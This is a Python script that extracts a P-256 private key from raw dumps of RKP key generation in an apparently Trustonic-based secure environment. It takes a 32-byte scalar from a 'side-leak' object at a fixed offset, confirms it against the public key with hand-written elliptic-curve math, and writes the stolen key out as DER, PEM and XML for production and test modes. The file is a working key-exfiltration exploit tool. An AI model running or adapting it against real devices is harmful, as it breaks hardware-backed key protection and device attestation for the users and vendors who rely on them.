#!/usr/bin/env python3
from __future__ import annotations
import base64
import hashlib
import json
import sys
from pathlib import Path
from xml.sax.saxutils import escape

LEAK_OFFSET = 0x400
OBJECT_LEN = 196
SCALAR_OFFSET = 0x98
SCALAR_LEN = 32

# P-256 params
p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc
Gx = 0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296
Gy = 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5
n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551

def inv(x: int) -> int:
    return pow(x, p - 2, p)

def add(P, Q):
    if P is None:
        return Q
    if Q is None:
        return P
    x1, y1 = P
    x2, y2 = Q
    if x1 == x2 and (y1 + y2) % p == 0:
        return None
    if P == Q:
        lam = ((3 * x1 * x1 + a) * inv((2 * y1) % p)) % p
    else:
        lam = ((y2 - y1) * inv((x2 - x1) % p)) % p
    x3 = (lam * lam - x1 - x2) % p
    y3 = (lam * (x1 - x3) - y1) % p
    return x3, y3

def mul(k: int, P=(Gx, Gy)):
    R = None
    while k:
        if k & 1:
            R = add(R, P)
        P = add(P, P)
        k >>= 1
    return R

def extract_xy(cose: bytes):
    i = cose.find(bytes.fromhex('215820'))
    j = cose.find(bytes.fromhex('225820'))
    if i < 0 or j < 0:
        raise ValueError('COSE_Key x/y markers not found')
    return cose[i + 3:i + 35], cose[j + 3:j + 35]

def der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return bytes([0x80 | len(b)]) + b

def tlv(tag: int, body: bytes) -> bytes:
    return bytes([tag]) + der_len(len(body)) + body

def make_sec1_der(scalar: bytes, x: bytes, y: bytes) -> bytes:
    oid_prime256v1 = bytes.fromhex('06082a8648ce3d030107')
    body = b''.join([
        tlv(0x02, b'\x01'),
        tlv(0x04, scalar),
        tlv(0xa0, oid_prime256v1),
        tlv(0xa1, tlv(0x03, b'\x00\x04' + x + y)),
    ])
    return tlv(0x30, body)

def pem(label: str, der: bytes) -> str:
    b64 = base64.encodebytes(der).decode().replace('\n', '')
    lines = [b64[i:i+64] for i in range(0, len(b64), 64)]
    return f'-----BEGIN {label}-----\n' + '\n'.join(lines) + f'\n-----END {label}-----\n'

def hx(b: bytes) -> str:
    return b.hex()

def process_mode(raw: Path, out: Path, mode: str):
    pub_len = (raw / f'rkp_gen_{mode}_pub_len.bin').read_bytes()
    pub_full = (raw / f'rkp_gen_{mode}_pub_full.bin').read_bytes()
    priv_len_blob = (raw / f'rkp_gen_{mode}_priv_len.bin').read_bytes()
    priv_full = (raw / f'rkp_gen_{mode}_priv_full.bin').read_bytes()
    tci = (raw / f'rkp_gen_{mode}_tci.bin').read_bytes()

    x, y = extract_xy(pub_len)
    obj = priv_full[LEAK_OFFSET:LEAK_OFFSET + OBJECT_LEN]
    scalar = obj[SCALAR_OFFSET:SCALAR_OFFSET + SCALAR_LEN]
    k = int.from_bytes(scalar, 'big')
    derived = mul(k)
    matched = derived == (int.from_bytes(x, 'big'), int.from_bytes(y, 'big'))
    if not (1 <= k < n):
        raise ValueError(f'{mode}: scalar outside P-256 order')
    if not matched:
        raise ValueError(f'{mode}: side-channel scalar does not match public key')

    mdir = out / mode
    mdir.mkdir(parents=True, exist_ok=True)
    (mdir / 'rkp_sideleak_object_196.bin').write_bytes(obj)
    (mdir / 'private_scalar.bin').write_bytes(scalar)
    (mdir / 'public_xy.bin').write_bytes(x + y)
    (mdir / 'stock_private_handle_216.bin').write_bytes(priv_len_blob)
    der = make_sec1_der(scalar, x, y)
    (mdir / 'debug_ec_private_key.der').write_bytes(der)
    (mdir / 'debug_ec_private_key.pem').write_text(pem('EC PRIVATE KEY', der), encoding='ascii')
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<RkpSideLeakDebugKey mode="{escape(mode)}" curve="secp256r1" source="direct-only-side-channel">
  <Status scalarMatchesPublic="true" stockPrivateHandleLen="{len(priv_len_blob)}" sideLeakOffset="0x{LEAK_OFFSET:x}" objectLen="{len(obj)}" scalarOffset="0x{SCALAR_OFFSET:x}"/>
  <PrivateScalar encoding="hex">{scalar.hex()}</PrivateScalar>
  <PublicKey format="raw-uncompressed-xy" encoding="hex">{(x+y).hex()}</PublicKey>
  <PublicX encoding="hex">{x.hex()}</PublicX>
  <PublicY encoding="hex">{y.hex()}</PublicY>
  <StockPrivateHandle format="trustonic-opaque" length="{len(priv_len_blob)}" sha256="{hashlib.sha256(priv_len_blob).hexdigest()}"/>
  <SideLeakObject length="{len(obj)}" sha256="{hashlib.sha256(obj).hexdigest()}"/>
  <PublicCoseMacedPublicKey length="{len(pub_len)}" sha256="{hashlib.sha256(pub_len).hexdigest()}"/>
</RkpSideLeakDebugKey>
'''
    (mdir / 'debug_key.xml').write_text(xml, encoding='utf-8')
    return {
        'mode': mode,
        'public_len': len(pub_len),
        'private_handle_len': len(priv_len_blob),
        'private_handle_first16': priv_len_blob[:16].hex(),
        'sideleak_object_len': len(obj),
        'sideleak_object_first16': obj[:16].hex(),
        'scalar_offset': hex(SCALAR_OFFSET),
        'scalar_sha256': hashlib.sha256(scalar).hexdigest(),
        'public_xy_sha256': hashlib.sha256(x + y).hexdigest(),
        'sideleak_object_sha256': hashlib.sha256(obj).hexdigest(),
        'private_handle_sha256': hashlib.sha256(priv_len_blob).hexdigest(),
        'derived_public_matches': matched,
        'tci_ret': int.from_bytes(tci[4:8], 'little'),
        'tci_pub_len': int.from_bytes(tci[17:21], 'little'),
        'tci_priv_len': int.from_bytes(tci[25:29], 'little'),
        'artifacts': {
            'object': str(mdir / 'rkp_sideleak_object_196.bin'),
            'scalar': str(mdir / 'private_scalar.bin'),
            'debug_xml': str(mdir / 'debug_key.xml'),
            'debug_pem': str(mdir / 'debug_ec_private_key.pem'),
            'stock_private_handle': str(mdir / 'stock_private_handle_216.bin'),
        },
    }

def main(argv):
    if len(argv) != 2:
        raise SystemExit(f'usage: {argv[0]} RUN_DIR')
    run = Path(argv[1]).resolve()
    raw = run / 'raw'
    out = run / 'parsed'
    out.mkdir(exist_ok=True)
    summary = [process_mode(raw, out, 'prod'), process_mode(raw, out, 'test')]
    (out / 'sideleak_summary.json').write_text(json.dumps(summary, indent=2, ensure_ascii=False) + '\n', encoding='utf-8')
    for item in summary:
        print(item['mode'], 'pub_len', item['public_len'], 'priv_handle_len', item['private_handle_len'], 'object_first16', item['sideleak_object_first16'], 'match', item['derived_public_matches'])
    print(out / 'sideleak_summary.json')

if __name__ == '__main__':
    main(sys.argv)
